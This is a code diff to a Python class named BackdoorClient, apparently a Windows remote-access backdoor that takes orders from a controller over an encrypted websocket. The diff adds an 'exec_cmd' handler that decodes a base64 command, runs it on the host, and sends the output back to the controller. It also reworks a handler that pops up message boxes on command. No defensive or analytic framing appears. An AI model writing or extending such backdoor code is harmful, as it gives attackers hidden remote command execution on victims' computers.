@@ -44,6 +44,8 @@ class BackdoorClient(threading.Thread):
 
                         if command == 'dialog':
                             ShowDialog(msg, self)
+                        elif command == 'exec_cmd':
+                            ExecCmd(msg, self)
 
                 self.ws.close()
 
@@ -68,9 +70,13 @@ class BackdoorClient(threading.Thread):
 
 
 class ExecCmd(threading.Thread):
-    def __init__(self, command):
+    def __init__(self, msg, client):
         threading.Thread.__init__(self)
-        self.command = command
+        self.msg = {'to': msg['from'], 'jobid': msg['jobid'], 'rlt': None}
+        self.client = client
+
+        self.command = b64decode(msg['cmd_to_exec'])
+        print self.command
 
         self.daemon = True
         self.start()
@@ -82,29 +88,32 @@ class ExecCmd(threading.Thread):
             stdout_value = proc.stdout.read()
             stdout_value += proc.stderr.read()
 
+            self.msg['rlt'] = decode2utf(stdout_value)
+            self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
+
         except Exception as e:
-            pass
+            self.msg['rlt'] = 'ERROR:' + e.message
+            self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
 
 
 class ShowDialog(threading.Thread):
     def __init__(self, msg, client):
         threading.Thread.__init__(self)
+        self.msg = {'to': msg['from'], 'jobid': msg['jobid'], 'rlt': None}
+        self.client = client
+
         self.content = decode2utf(b64decode(msg['content']))
-        print self.content
-        self.msg = msg
         self.title = None if not msg['title'] else decode2utf(b64decode(msg['title']))
         if not self.title:
             self.title = u''
-
-        self.client = client
 
         self.daemon = True
         self.start()
 
     def run(self):
         ctypes.windll.user32.MessageBoxW(None, self.content, self.title, 0)
-        to_send_msg = {'to': self.msg['from'], 'jobid': self.msg['jobid'], 'rlt': 'OK'}
-        self.client.ws.send(self.client.encrypt(json.dumps(to_send_msg)))
+        self.msg['rlt'] = 'OK'
+        self.client.ws.send(self.client.encrypt(json.dumps(self.msg)))
 
 
 def decode2utf(rawstr):
